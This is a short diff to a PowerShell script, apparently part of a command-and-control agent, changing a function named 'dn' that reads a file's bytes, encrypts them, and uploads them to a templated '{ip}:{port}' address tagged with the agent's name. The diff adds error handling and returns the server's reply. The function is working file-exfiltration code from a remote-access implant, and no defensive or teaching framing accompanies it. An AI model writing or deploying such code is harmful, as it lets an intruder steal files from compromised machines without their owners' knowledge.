@@ -75,13 +75,22 @@ return $output
 
       function dn($filename){
 
-            $file_content = Get-Content $filename -Encoding Byte
+                        try{
+
+                  $file_content = Get-Content $filename -Encoding Byte
+                  if ($file_content.Length -eq 0){
+                  return $Error[0]}
+                  }
+                  catch{
+                  $output = $Error[0] | Out-String;
+                  return $output
+                  }
             $content = enc -key $key -un $file_content -file 1
             $handle = new-object net.WebClient;
             $handleh = $handle.Headers;
             $handleh.add("Content-Type", "application/x-www-form-urlencoded");
-            $handle.UploadString("http://{ip}:{port}{download}/$agent", "f:$filename&d:$content");
-
+            $output=$handle.UploadString("http://{ip}:{port}{download}/$agent", "f:$filename&d:$content");
+            return $output
             }
 
 
